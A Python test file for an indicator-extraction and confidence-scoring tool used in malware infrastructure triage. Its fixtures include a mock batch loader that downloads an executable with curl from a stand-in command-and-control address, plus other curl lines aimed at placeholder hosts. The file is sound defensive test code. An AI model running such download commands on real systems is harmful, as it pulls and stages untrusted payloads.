"""How sure a run is that an indicator is a live part of the kit.

The expected scores are written out as numbers on purpose. If a weight moves,
these tests should notice, rather than recompute themselves from the table.
"""

from __future__ import annotations

import json
from pathlib import Path

from typer.testing import CliRunner

from dirsift import cli
from dirsift.analyze import analyze
from dirsift.asn import AsnTable
from dirsift.confidence import band
from dirsift.extract import dedupe_iocs, extract_iocs, is_comment
from dirsift.models import Entry, ScanResult
from dirsift.report import render_markdown
from dirsift.report_model import build_report

runner = CliRunner()

ROOT = "http://203.0.113.24/files/"


def entry(name: str, text: str, kind: str = "data", **kw) -> Entry:
    folder, _, base = name.rpartition("/")
    return Entry(
        url=ROOT + name,
        name=base,
        depth=name.count("/") + 1,
        parent_url=ROOT + (folder + "/" if folder else ""),
        kind=kind,
        fetched_bytes=len(text.encode("utf-8")),
        text_preview=text,
        **kw,
    )


def run(*entries: Entry, **kw) -> ScanResult:
    scan = ScanResult(root_url=ROOT, entries=list(entries), **kw)
    result, _ = analyze(scan, asn_table=AsnTable())
    return result


def ioc(result: ScanResult, value: str):
    matches = [i for i in result.iocs if i.value == value]
    assert matches, f"{value} not extracted: {[i.value for i in result.iocs]}"
    return matches[0]


# Old runs


def test_a_run_saved_before_the_new_fields_loads_and_is_scored(tmp_path: Path):
    """The shape a run had before: no occurrences, no comment flag, no confidence."""
    old = {
        "root_url": ROOT,
        "entries": [
            {
                "url": ROOT + "config.ini",
                "name": "config.ini",
                "depth": 1,
                "kind": "config",
                "text_preview": "host=198.51.100.77\n",
            }
        ],
        "iocs": [
            {
                "ioc_type": "ipv4",
                "value": "198.51.100.77",
                "defanged": "198[.]51[.]100[.]77",
                "source_url": ROOT + "config.ini",
            }
        ],
    }
    path = tmp_path / "old.json"
    path.write_text(json.dumps(old), encoding="utf-8")
    loaded = ScanResult.model_validate(json.loads(path.read_text(encoding="utf-8")))
    assert loaded.iocs[0].occurrences == 1
    assert loaded.iocs[0].confidence is None
    rescored, _ = analyze(loaded, asn_table=AsnTable())
    assert rescored.iocs[0].confidence == 60
    reply = runner.invoke(cli.app, ["iocs", str(path)])
    assert reply.exit_code == 0
    assert reply.stdout == "198[.]51[.]100[.]77\n"


# How an indicator sat in the file


def one(text: str, value: str, source: str = ROOT + "a.txt"):
    found = [i for i in extract_iocs(text, source) if i.value == value]
    assert found, f"{value} not found"
    return found[0]


def test_comment_prefixes_across_languages():
    for line in (
        "# old c2", "  // note", "; backup", "REM old box", "rem lower too", ":: batch",
        "<!-- html -->", "/* block", " * block body",
    ):
        assert is_comment(line), line
    for line in ("#!/bin/sh", "curl http://x", "set a=1", "remove.exe", "  host=1.2.3.4"):
        assert not is_comment(line), line


def test_an_indicator_only_in_comments_is_flagged_and_counted():
    found = one("# old c2: 203.0.113.50\n// again 203.0.113.50\n", "203.0.113.50")
    assert found.in_comment
    assert found.occurrences == 2


def test_one_live_mention_outside_a_comment_is_enough():
    found = one("# old c2: 203.0.113.50\nhost=203.0.113.50\n", "203.0.113.50")
    assert not found.in_comment
    assert found.occurrences == 2


def test_a_shebang_line_is_not_a_comment():
    found = one("#!/usr/bin/env -S curl http://198.51.100.7/x\n", "198.51.100.7")
    assert not found.in_comment


def test_windows_line_endings_do_not_hide_a_comment():
    text = "@echo off\r\nREM old box 203.0.113.50\r\n:: also 198.51.100.9\r\ncurl 198.51.100.8\r\n"
    assert one(text, "203.0.113.50").in_comment
    assert one(text, "198.51.100.9").in_comment
    assert not one(text, "198.51.100.8").in_comment


def test_a_value_written_only_defanged_is_not_live():
    found = one("see hxxp://bad[.]example[.]com/x for details\n", "http://bad.example.com/x")
    assert not found.seen_live
    assert one("curl http://bad.example.com/x\n", "http://bad.example.com/x").seen_live


def test_live_checks_ignore_the_case_the_file_used():
    assert one("ping CDN.Panel-Gate.XYZ\n", "cdn.panel-gate.xyz").seen_live


def test_non_network_indicators_are_always_live():
    found = one("set password = hunter2-secret\n", "hunter2-secret")
    assert found.seen_live


def test_dedupe_merges_sources_counts_and_flags():
    first = extract_iocs("# 203.0.113.50\n", ROOT + "a.txt")
    second = extract_iocs("host=203.0.113.50\nback=203.0.113.50\n", ROOT + "b.ini")
    third = extract_iocs("# 203.0.113.50\n", ROOT + "a.txt")
    (merged,) = [i for i in dedupe_iocs(first + second + third) if i.value == "203.0.113.50"]
    assert merged.sources == [ROOT + "a.txt", ROOT + "b.ini"]
    assert merged.occurrences == 4
    assert merged.source_url == ROOT + "a.txt"
    assert not merged.in_comment
    assert merged.seen_live


def test_dedupe_keeps_a_comment_only_indicator_a_comment():
    first = extract_iocs("# 203.0.113.50\n", ROOT + "a.txt")
    second = extract_iocs("; 203.0.113.50\n", ROOT + "b.ini")
    (merged,) = dedupe_iocs(first + second)
    assert merged.in_comment


# The score


def test_a_live_address_in_one_config_is_medium():
    found = ioc(run(entry("c2.ini", "host=198.51.100.77\n", "config")), "198.51.100.77")
    assert found.confidence == 60
    assert band(found.confidence) == "medium"
    assert found.confidence_reasons == ["sits in a config or script"]


def test_an_address_in_three_files_one_a_config_is_high():
    result = run(
        entry("a.txt", "server 198.51.100.77\n"),
        entry("b.txt", "fallback 198.51.100.77\n"),
        entry("c.ini", "host=198.51.100.77\n", "config"),
    )
    found = ioc(result, "198.51.100.77")
    assert found.confidence == 80
    assert band(found.confidence) == "high"
    assert "named in 3 files" in found.confidence_reasons


def test_a_domain_kept_through_builds_gets_the_family_bonus():
    result = run(*(entry(f"svc{n}.exe", "beacon cdn.panel-gate.xyz\n", "pe") for n in (4, 5, 6)))
    found = ioc(result, "cdn.panel-gate.xyz")
    assert "survived across builds of svc{n}.exe" in found.confidence_reasons
    assert found.confidence == 85  # 50, +20 for two more files, +15 for the family


def test_an_address_only_in_a_comment_is_low():
    found = ioc(run(entry("notes.txt", "# old c2: 203.0.113.50\n")), "203.0.113.50")
    assert found.confidence == 35
    assert band(found.confidence) == "low"
    assert found.confidence_reasons == ["only in comments"]


def test_a_url_written_only_defanged_loses_25():
    found = ioc(run(entry("notes.txt", "see hxxp://bad[.]example[.]com/x\n")),
                "http://bad.example.com/x")
    assert not found.seen_live
    assert found.confidence == 25
    assert found.confidence_reasons == [
        "written defanged in the source; likely someone's notes, not live config"
    ]


def test_defanged_in_a_comment_here_and_live_in_a_config_there_is_not_penalised():
    result = run(
        entry("notes.txt", "# old panel hxxps://panel-gate[.]xyz/login\n"),
        entry("app.json", '{"panel": "https://panel-gate.xyz/login"}', "config"),
    )
    found = ioc(result, "https://panel-gate.xyz/login")
    assert found.seen_live and not found.in_comment
    assert "only in comments" not in found.confidence_reasons
    assert not any("defanged" in reason for reason in found.confidence_reasons)
    assert found.confidence == 70  # 50, +10 second file, +10 config


def test_a_public_resolver_in_a_script_is_low():
    found = ioc(run(entry("check.bat", "ping 8.8.8.8\n", "script")), "8.8.8.8")
    assert found.confidence == 30
    assert band(found.confidence) == "low"
    assert found.confidence_reasons[0].startswith("public resolver")


def test_a_private_address_with_a_port_is_still_private():
    found = ioc(run(entry("c2.ini", "listen=10.0.0.5:4444\n", "config")), "10.0.0.5:4444")
    assert found.confidence == 40
    assert found.confidence_reasons[0].startswith("private address")


def test_the_targets_own_address_points_back_at_it():
    found = ioc(run(entry("up.sh", "curl http://203.0.113.24:9000/up\n", "script")),
                "203.0.113.24:9000")
    assert "points back at the host being triaged" in found.confidence_reasons
    assert found.confidence == 70
    url = ioc(run(entry("up.sh", "curl http://203.0.113.24:9000/up\n", "script")),
              "http://203.0.113.24:9000/up")
    assert "points back at the host being triaged" in url.confidence_reasons


def test_an_indicator_seen_only_in_cut_files_loses_5():
    found = ioc(run(entry("big.txt", "beacon 198.51.100.77\n", truncated=True)), "198.51.100.77")
    assert found.confidence == 45
    assert found.confidence_reasons == ["read from the head of the file only"]


def test_the_score_never_leaves_the_scale():
    low = ioc(run(entry("notes.txt", "# resolver 8[.]8[.]8[.]8\n")), "8.8.8.8")
    assert low.confidence == 0
    assert low.confidence_reasons == [
        "public resolver; usually a connectivity check, not infrastructure",
        "written defanged in the source; likely someone's notes, not live config",
        "only in comments",
    ]
    driver = entry(
        "run.bat", "start svc4.bat\nstart svc5.bat\nstart svc6.bat\nrem 1\ncurl 203.0.113.24\n",
        "script",
    )
    builds = [entry(f"svc{n}.bat", "curl 203.0.113.24\n", "script") for n in (4, 5, 6)]
    high = ioc(run(driver, *builds), "203.0.113.24")
    assert high.confidence == 100
    assert "named by the likely entry point" in high.confidence_reasons


def test_reasons_are_ordered_by_effect():
    result = run(
        entry("a.ini", "host=10.0.0.5\n", "config"),
        entry("b.ini", "host=10.0.0.5\n", "config"),
    )
    assert ioc(result, "10.0.0.5").confidence_reasons == [
        "private address; does not pivot outside that network",
        "named in 2 files",
        "sits in a config or script",
    ]


def test_the_same_run_scores_the_same_way_twice():
    def build():
        return run(
            entry("a.ini", "host=198.51.100.77\n# 203.0.113.50\n", "config"),
            entry("b.sh", "curl http://198.51.100.77/x\nping 8.8.8.8\n", "script"),
        )

    first = [(i.value, i.confidence, i.confidence_reasons) for i in build().iocs]
    second = [(i.value, i.confidence, i.confidence_reasons) for i in build().iocs]
    assert first == second


def test_non_ascii_comments_and_names_do_not_upset_the_score():
    result = run(
        entry(
            "ödeme_отчет.ini",
            "# eski sunucu: 203.0.113.50, не использовать\nhost=198.51.100.77\n",
            "config",
        ),
    )
    assert ioc(result, "203.0.113.50").confidence == 45  # 50, +10 config, -15 comment
    assert ioc(result, "198.51.100.77").confidence == 60


# The report and the pipe

#: The fixture the pipe tests run on: a batch loader with Windows line endings
#: and a config, with live, commented, defanged and resolver indicators.
LOADER = (
    "@echo off\r\nREM old box 203.0.113.50\r\n"
    "curl -o a.exe http://198.51.100.77:8443/a.exe\r\nping cdn.panel-gate.xyz\r\n"
)
CONFIG = (
    "[c2]\nhost=198.51.100.77:8443\n; backup hxxp://old-panel[.]xyz/gate\nresolver=8.8.8.8\n"
)

#: What `dirsift iocs` printed for that fixture before indicators had a score.
#: Written out, so a change to the default output cannot pass unnoticed.
IOCS_BEFORE = (
    "198[.]51[.]100[.]77:8443\n"
    "203[.]0[.]113[.]50\n"
    "8[.]8[.]8[.]8\n"
    "hxxp://198[.]51[.]100[.]77:8443/a[.]exe\n"
    "hxxp://old-panel[.]xyz/gate\n"
    "cdn[.]panel-gate[.]xyz\n"
    "old-panel[.]xyz\n"
)


def fixture_run(tmp_path: Path) -> Path:
    result = ScanResult(
        root_url=ROOT,
        entries=[
            entry("install.bat", LOADER, "script"),
            entry("config.ini", CONFIG, "config"),
        ],
    )
    path = tmp_path / "run.json"
    path.write_text(result.model_dump_json(indent=2), encoding="utf-8")
    return path


def test_iocs_without_a_threshold_prints_exactly_what_it_did_before(tmp_path: Path):
    reply = runner.invoke(cli.app, ["iocs", str(fixture_run(tmp_path))])
    assert reply.exit_code == 0
    assert reply.stdout == IOCS_BEFORE


def test_iocs_with_a_threshold_keeps_the_high_ones(tmp_path: Path):
    """A third file that names the callback lifts it to high; nothing else gets there."""
    result = ScanResult(
        root_url=ROOT,
        entries=[
            entry("install.bat", LOADER, "script"),
            entry("config.ini", CONFIG, "config"),
            entry("backup.ini", "host=198.51.100.77:8443\n", "config"),
        ],
    )
    path = tmp_path / "run.json"
    path.write_text(result.model_dump_json(indent=2), encoding="utf-8")
    reply = runner.invoke(cli.app, ["iocs", str(path), "-c", "75"])
    assert reply.exit_code == 0
    assert reply.stdout == "198[.]51[.]100[.]77:8443\n"
    result, _ = analyze(
        ScanResult.model_validate(json.loads(path.read_text(encoding="utf-8"))),
        asn_table=AsnTable(),
    )
    printed = set(reply.stdout.splitlines())
    for found in result.iocs:
        assert (found.defanged in printed) == (band(found.confidence) == "high")


def test_iocs_refuses_a_threshold_off_the_scale(tmp_path: Path):
    for value in ("150", "-1"):
        reply = runner.invoke(cli.app, ["iocs", str(fixture_run(tmp_path)), "-c", value])
        assert reply.exit_code == 2
        assert value in reply.stdout


def test_the_report_shows_band_and_score_strongest_first():
    """Appendix B lists every indicator with its band and score, highest first, and the
    reasons beside the low ones; the most useful table carries the band and score."""
    result, candidates = analyze(
        ScanResult(
            root_url=ROOT,
            entries=[entry("install.bat", LOADER, "script"), entry("config.ini", CONFIG, "config")],
        ),
        asn_table=AsnTable(),
    )
    markdown = render_markdown(build_report(result, candidates))
    assert "it says nothing about intent" in markdown
    appendix = markdown.split("## Appendix B. All indicators", 1)[1]
    block = appendix.split("**IPv4 (3)**", 1)[1].split("```", 2)[1].strip().splitlines()
    block = [" ".join(line.split()) for line in block[1:]]  # past the fence's language tag
    assert block[0] == "198[.]51[.]100[.]77:8443 medium 70 install.bat, config.ini"
    assert block[1] == (
        "203[.]0[.]113[.]50 low 45 install.bat (only in comments, sits in a config or script)"
    )
    assert block[2] == (
        "8[.]8[.]8[.]8 low 30 config.ini (public resolver, sits in a config or script)"
    )
    useful = markdown.split("### Most useful first", 1)[1].split("\n## ", 1)[0]
    assert "| Confidence |" in useful
    assert "| `cdn[.]panel-gate[.]xyz` | medium 60 |" in useful


# The bundle and the pivots


def both_runs():
    return analyze(
        ScanResult(
            root_url=ROOT,
            entries=[
                entry("install.bat", LOADER, "script", sha256="a" * 64),
                entry("config.ini", CONFIG, "config", sha256="b" * 64),
            ],
        ),
        asn_table=AsnTable(),
    )


def test_bundle_indicators_carry_the_confidence_and_hash_indicators_do_not():
    from dirsift.stix import build_bundle

    result, candidates = both_runs()
    objects = build_bundle(result, candidates)["objects"]
    indicators = [o for o in objects if o["type"] == "indicator"]
    by_pattern = {o["pattern"]: o for o in indicators}
    assert by_pattern["[ipv4-addr:value = '198.51.100.77']"]["confidence"] == 70
    assert by_pattern["[ipv4-addr:value = '8.8.8.8']"]["confidence"] == 30
    hashes = [o for o in indicators if o["pattern"].startswith("[file:")]
    assert hashes and all("confidence" not in o for o in hashes)


def test_scored_bundles_still_pass_the_strict_validator():
    from stix2validator import ValidationOptions, validate_string

    from dirsift.stix import build_bundle, bundle_json

    text = bundle_json(build_bundle(*both_runs()))
    results = validate_string(text, ValidationOptions(version="2.1", strict=True))
    assert results.is_valid, [str(e) for e in results.errors]


def test_indicator_pivots_are_ordered_by_confidence_inside_their_strength():
    from dirsift.pivots import build_pivots

    pivots = [
        p for p in build_pivots(*both_runs()) if p.basis == "indicator" and p.engine == "shodan"
    ]
    scores = [p.confidence for p in pivots]
    assert scores == sorted(scores, reverse=True)
    assert pivots[0].query == "net:198.51.100.77/32"
